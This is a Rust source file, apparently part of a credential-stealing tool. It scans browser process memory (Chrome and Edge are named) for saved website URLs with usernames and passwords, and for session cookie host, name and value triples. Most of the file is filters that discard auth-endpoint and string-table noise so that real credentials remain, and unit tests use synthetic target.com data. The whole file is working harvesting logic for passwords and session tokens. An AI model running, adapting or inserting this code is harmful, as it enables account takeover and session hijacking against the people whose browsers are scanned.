//! Pattern-free fallback: scan heap for Unicode (URL, username, password) triples.

#[derive(Debug, Clone)]
pub struct PasswordTriple {
    pub url: String,
    pub username: String,
    pub password: String,
}

/// Walk `mem` looking for Unicode "https://..." strings, then within a fixed window
/// after each URL look for two more length-prefixed Unicode strings.
pub fn scan_heap_for_passwords(mem: &[u8]) -> Vec<PasswordTriple> {
    let mut out = Vec::new();
    // Scan for UTF-16LE "https://" -> h\0 t\0 t\0 p\0 s\0 :\0 /\0 /\0
    let needle: &[u8] = b"h\0t\0t\0p\0s\0:\0/\0/\0";
    let mut i = 0usize;
    while i + needle.len() <= mem.len() {
        if &mem[i..i + needle.len()] == needle {
            if let Some(t) = harvest_at(mem, i) {
                if plausible(&t) {
                    out.push(t);
                }
            }
            i += needle.len();
        } else {
            i += 1;
        }
    }
    out
}

fn harvest_at(mem: &[u8], at: usize) -> Option<PasswordTriple> {
    // Read UTF-16LE up to a NUL terminator, max 4096 chars.
    let url = read_utf16le_until_nul(mem, at, 4096)?;
    // Within ~16KB after the URL, find two more length-bounded strings = username, password.
    let window_end = (at + url.len() * 2 + 16384).min(mem.len());
    let mut found_strings: Vec<(usize, String)> = Vec::new();
    let mut k = at + url.len() * 2;
    while k < window_end && found_strings.len() < 8 {
        if let Some(s) = read_utf16le_until_nul(mem, k, 256) {
            if !s.is_empty() && s.chars().all(|c| !c.is_control() || c == ' ') {
                found_strings.push((k, s.clone()));
                k += s.len() * 2 + 2;
                continue;
            }
        }
        k += 2;
    }
    if found_strings.len() >= 2 {
        Some(PasswordTriple {
            url,
            username: found_strings[0].1.clone(),
            password: found_strings[1].1.clone(),
        })
    } else { None }
}

fn read_utf16le_until_nul(mem: &[u8], at: usize, max_chars: usize) -> Option<String> {
    let mut units = Vec::new();
    let mut i = at;
    while i + 2 <= mem.len() && units.len() < max_chars {
        let u = u16::from_le_bytes([mem[i], mem[i + 1]]);
        if u == 0 { break; }
        units.push(u);
        i += 2;
    }
    if units.is_empty() { return None; }
    Some(String::from_utf16_lossy(&units))
}

/// Hosts that appear in chrome/edge auth-flow string tables but are *not*
/// real saved-credential URLs. The heuristic finds `https://...` strings
/// anywhere in memory; without filtering these we get thousands of
/// false-positive triples whose "URL" is a Microsoft/Xbox auth endpoint
/// and whose "username" / "password" are whatever bytes happened to
/// follow in the DLL.
/// Hosts that appear in chrome/edge auth-flow and internal-API string
/// tables but are *not* real saved-credential URLs. The heuristic finds
/// `https://...` strings anywhere in memory; without filtering these we
/// get thousands of false-positive triples whose "URL" is a
/// Microsoft/Xbox/Apple auth endpoint or an Edge-internal API and whose
/// "username" / "password" are whatever bytes happened to follow.
const AUTH_NOISE_HOSTS: &[&str] = &[
    "login.microsoft.com",
    "login.microsoftonline.com",
    "login.windows.net",
    "login.live.com",
    "xsts.auth.xboxlive.com",
    "user.auth.xboxlive.com",
    "device.login.microsoftonline.com",
    "accounts.google.com",
    "oauth.googleusercontent.com",
    "appleid.apple.com",
];

/// Host suffixes that flag the URL as an internal Microsoft / chrome.dll
/// API endpoint rather than a user-saved credential URL.
const NOISE_HOST_SUFFIXES: &[&str] = &[
    ".cdp.microsoft.com",          // Edge CDP / Connected Device Platform
    ".edgesv.microsoft.com",       // Edge service backend
    ".windows.com",                // generic MS svcs that show up in strings
    ".microsoftonline.com",        // AAD / Office 365 backend
    ".live.com",                   // Xbox / Live backends
    ".googleusercontent.com",      // Google CDN / OAuth content
    ".gstatic.com",                // Google static asset CDN
    ".chrome.com",                 // Chrome telemetry / sync
    "chromewebstore.googleapis.com",
    "clients.google.com",
    "update.googleapis.com",
];

fn url_host(url: &str) -> &str {
    let s = url.strip_prefix("https://").unwrap_or(url);
    s.split('/').next().unwrap_or(s)
}

fn host_is_auth_noise(url: &str) -> bool {
    let host = url_host(url);
    if AUTH_NOISE_HOSTS.iter().any(|h| host == *h) {
        return true;
    }
    NOISE_HOST_SUFFIXES.iter().any(|suf| host.ends_with(suf))
}

/// Username heuristic: real saved usernames are email addresses or
/// alphanumeric handles. They never contain `/` (that's a URL path
/// fragment), never start with `http`, and aren't pure CJK noise.
fn looks_like_username(s: &str) -> bool {
    if s.len() < 3 || s.len() > 128 {
        return false;
    }
    // URL fragments captured after a null terminator: `internal/`,
    // `api/v1/`, etc. Real usernames never contain `/`.
    if s.contains('/') {
        return false;
    }
    if s.starts_with("http://") || s.starts_with("https://") || s.contains("://") {
        return false;
    }
    // 80%+ ASCII to reject CJK / random-bytes-as-UTF-16 noise.
    let ascii_count = s.chars().filter(|c| c.is_ascii()).count();
    if ascii_count * 100 / s.chars().count().max(1) < 80 {
        return false;
    }
    // Real usernames are email-shaped or alphanumeric handles. Require at
    // least 3 alphanumeric chars to drop pure-punctuation strings.
    let alnum = s.chars().filter(|c| c.is_ascii_alphanumeric()).count();
    if alnum < 3 {
        return false;
    }
    // Email shape (`a@b.c` with a TLD-shaped tail) or all-tokenchars
    // identifier (letters / digits / `_-.+`). Reject anything else.
    let is_email = s.contains('@')
        && s.matches('@').count() == 1
        && s.split_once('@')
            .map(|(local, domain)| !local.is_empty() && domain.contains('.'))
            .unwrap_or(false);
    let is_handle = s
        .chars()
        .all(|c| c.is_ascii_alphanumeric() || matches!(c, '_' | '-' | '.' | '+'));
    is_email || is_handle
}

fn looks_like_password(s: &str) -> bool {
    if s.len() < 6 || s.len() > 128 {
        return false;
    }
    // Real saved passwords aren't URLs or URL fragments.
    if s.contains("://") || s.starts_with('/') || s.starts_with("http") {
        return false;
    }
    // 80%+ ASCII to reject CJK / random-bytes-as-UTF-16 noise.
    let ascii_count = s.chars().filter(|c| c.is_ascii()).count();
    if ascii_count * 100 / s.chars().count().max(1) < 80 {
        return false;
    }
    // Real passwords contain at least one letter and one digit OR
    // special character — pure-letter "passwords" of length 6+ in
    // process memory are overwhelmingly debug strings, function names,
    // or HTTP method tokens.
    let has_letter = s.chars().any(|c| c.is_ascii_alphabetic());
    let has_digit_or_special = s
        .chars()
        .any(|c| c.is_ascii_digit() || (c.is_ascii_punctuation() && c != '/'));
    if !has_letter || !has_digit_or_special {
        return false;
    }
    // No whitespace inside the value — real passwords occasionally have
    // spaces, but those are very rare and indistinguishable from a
    // function-arg-style "arg1 arg2" capture; better to drop them.
    !s.chars().any(|c| c.is_whitespace() || c.is_control())
}

fn plausible(t: &PasswordTriple) -> bool {
    t.url.starts_with("https://")
        && t.url.len() < 2048
        && !t.url.contains('\u{FFFD}')
        && !host_is_auth_noise(&t.url)
        && !t.username.contains('\u{FFFD}')
        && !t.password.contains('\u{FFFD}')
        && looks_like_username(&t.username)
        && looks_like_password(&t.password)
}

#[derive(Debug, Clone)]
pub struct CookieTriple {
    pub host: String,
    pub name: String,
    pub value: String,
}

/// Scan ASCII host strings (domain-looking) followed by a cookie name and
/// value within a small window. Dedupes by `(host, name, value)` because
/// chrome.dll's string tables hold many copies of the same config key
/// triples (telemetry enum values, AAD scope names, etc).
pub fn scan_heap_for_cookies(mem: &[u8]) -> Vec<CookieTriple> {
    let mut out = Vec::new();
    let mut seen: std::collections::HashSet<(String, String, String)> =
        std::collections::HashSet::new();
    let mut i = 0usize;
    while i < mem.len() {
        if mem[i] == b'.' || mem[i].is_ascii_alphabetic() {
            if let Some((host, len)) = read_ascii_domain(&mem[i..]) {
                let mut k = i + len + 1;
                let win_end = (k + 2048).min(mem.len());
                let mut strs: Vec<String> = Vec::new();
                while k < win_end && strs.len() < 4 {
                    if let Some((s, slen)) = read_ascii_cstr(&mem[k..]) {
                        if !s.is_empty() && s.len() < 4096 {
                            strs.push(s);
                        }
                        k += slen + 1;
                    } else {
                        k += 1;
                    }
                }
                if strs.len() >= 2 {
                    let triple = CookieTriple {
                        host,
                        name: strs[0].clone(),
                        value: strs[1].clone(),
                    };
                    if plausible_cookie(&triple) {
                        let key = (
                            triple.host.clone(),
                            triple.name.clone(),
                            triple.value.clone(),
                        );
                        if seen.insert(key) {
                            out.push(triple);
                        }
                    }
                }
                i += len + 1;
                continue;
            }
        }
        i += 1;
    }
    out
}

fn read_ascii_domain(b: &[u8]) -> Option<(String, usize)> {
    let mut n = 0;
    while n < b.len() && n < 256 {
        let c = b[n];
        if c == 0 { break; }
        if !(c.is_ascii_alphanumeric() || c == b'.' || c == b'-' || c == b'_') {
            return None;
        }
        n += 1;
    }
    if n < 4 { return None; }
    let s = std::str::from_utf8(&b[..n]).ok()?.to_string();
    if !s.contains('.') { return None; }
    Some((s, n))
}

fn read_ascii_cstr(b: &[u8]) -> Option<(String, usize)> {
    let mut n = 0;
    while n < b.len() && n < 4096 {
        let c = b[n];
        if c == 0 { break; }
        if c < 0x20 || c > 0x7E { return None; }
        n += 1;
    }
    if n == 0 { return None; }
    let s = std::str::from_utf8(&b[..n]).ok()?.to_string();
    Some((s, n))
}

/// Common TLDs accepted by the in-process cookie heuristic. The list is
/// intentionally narrow — it's a structural anti-noise filter rather than a
/// real public-suffix check. Anything past these is dropped along with the
/// many false-positive "domain-shaped" strings that turn up in process
/// memory (function names, paths, debug strings, etc).
const COMMON_TLDS: &[&str] = &[
    "com", "org", "net", "io", "gov", "edu", "mil", "co", "us", "uk", "de",
    "fr", "es", "it", "ru", "cn", "jp", "kr", "in", "br", "ca", "au", "nl",
    "se", "no", "fi", "dk", "pl", "ch", "at", "be", "ie", "info", "biz",
    "me", "tv", "app", "dev", "ai", "tech", "online", "site", "shop",
    "store", "blog", "news", "cloud",
];

fn host_has_common_tld(host: &str) -> bool {
    let host = host.trim_start_matches('.').to_ascii_lowercase();
    let Some(last_dot) = host.rfind('.') else {
        return false;
    };
    let tld = &host[last_dot + 1..];
    COMMON_TLDS.iter().any(|t| *t == tld)
}

/// Returns true if `s` contains any substring that strongly suggests it's
/// a URL or domain fragment rather than a cookie name or value (`.com`,
/// `.net`, `://`, etc.). Used to drop heuristic captures where the
/// `read_ascii_cstr` loop walked past a struct boundary and concatenated
/// a UUID with a domain.
fn contains_url_fragment(s: &str) -> bool {
    let lower = s.to_ascii_lowercase();
    if lower.contains("://") {
        return true;
    }
    for tld in [".com", ".net", ".org", ".io", ".co.", ".edu", ".gov", ".de.", ".fr.", ".uk.", ".cn"] {
        if lower.contains(tld) {
            return true;
        }
    }
    false
}

fn looks_like_cookie_name(s: &str) -> bool {
    if s.len() < 2 || s.len() > 48 {
        return false;
    }
    // Cookie names per RFC 6265: token characters
    // (alphanumeric plus `! # $ % & ' * + - . ^ _ ` | ~`). We require the
    // first byte to be a letter or underscore to avoid matching version
    // numbers and ID-shaped strings.
    let first = s.as_bytes()[0];
    if !(first.is_ascii_alphabetic() || first == b'_') {
        return false;
    }
    if !s.bytes().all(|b| {
        b.is_ascii_alphanumeric() || matches!(b, b'_' | b'-' | b'.' | b'~' | b'#' | b'$')
    }) {
        return false;
    }
    // Reject UUID-or-domain-fragment shapes. Real cookie names never
    // embed `.com`-shaped fragments; if we see one, the heuristic
    // walked past a struct boundary.
    !contains_url_fragment(s)
}

fn looks_like_cookie_value(s: &str) -> bool {
    if s.len() < 8 || s.len() > 4096 {
        return false;
    }
    if contains_url_fragment(s) {
        return false;
    }
    // Real cookie values are session IDs, base64 / hex / URL-encoded
    // payloads, JWTs, etc. They almost always mix at least two of
    // {letter, digit, special-char} — pure-letter values of length 8+
    // are overwhelmingly debug strings or function names.
    let has_letter = s.chars().any(|c| c.is_ascii_alphabetic());
    let has_digit = s.chars().any(|c| c.is_ascii_digit());
    let has_special = s
        .chars()
        .any(|c| c.is_ascii_punctuation() && !matches!(c, '/' | '\\'));
    let classes = [has_letter, has_digit, has_special]
        .iter()
        .filter(|b| **b)
        .count();
    classes >= 2
}

fn host_for_noise_check(host: &str) -> &str {
    host.trim_start_matches('.')
}

fn cookie_host_is_noise(host: &str) -> bool {
    let h = host_for_noise_check(host);
    AUTH_NOISE_HOSTS.iter().any(|n| h == *n)
        || NOISE_HOST_SUFFIXES.iter().any(|suf| h.ends_with(suf))
}

fn plausible_cookie(t: &CookieTriple) -> bool {
    t.host.contains('.')
        && t.host.len() < 256
        && host_has_common_tld(&t.host)
        && !cookie_host_is_noise(&t.host)
        && looks_like_cookie_name(&t.name)
        && looks_like_cookie_value(&t.value)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn utf16(s: &str) -> Vec<u8> {
        let mut v = Vec::new();
        for u in s.encode_utf16() {
            v.extend_from_slice(&u.to_le_bytes());
        }
        v.extend_from_slice(&[0, 0]); // nul
        v
    }

    #[test]
    fn finds_triple() {
        let mut buf = vec![0u8; 64];
        buf.extend(utf16("https://target.com/login"));
        buf.extend(vec![0u8; 16]);
        buf.extend(utf16("alice"));
        buf.extend(vec![0u8; 16]);
        buf.extend(utf16("P@ssw0rd"));
        buf.extend(vec![0u8; 64]);
        let r = scan_heap_for_passwords(&buf);
        assert_eq!(r.len(), 1);
        assert_eq!(r[0].url, "https://target.com/login");
        assert_eq!(r[0].username, "alice");
        assert_eq!(r[0].password, "P@ssw0rd");
    }

    #[test]
    fn finds_cookie_triple() {
        let mut buf = vec![0u8; 16];
        buf.extend_from_slice(b".target.com\0");
        buf.extend_from_slice(b"SESSION\0");
        buf.extend_from_slice(b"AbCdEf012345XXX\0");
        buf.extend(vec![0u8; 16]);
        let r = scan_heap_for_cookies(&buf);
        assert_eq!(r.len(), 1);
        assert_eq!(r[0].host, ".target.com");
        assert_eq!(r[0].name, "SESSION");
        assert_eq!(r[0].value, "AbCdEf012345XXX");
    }
}
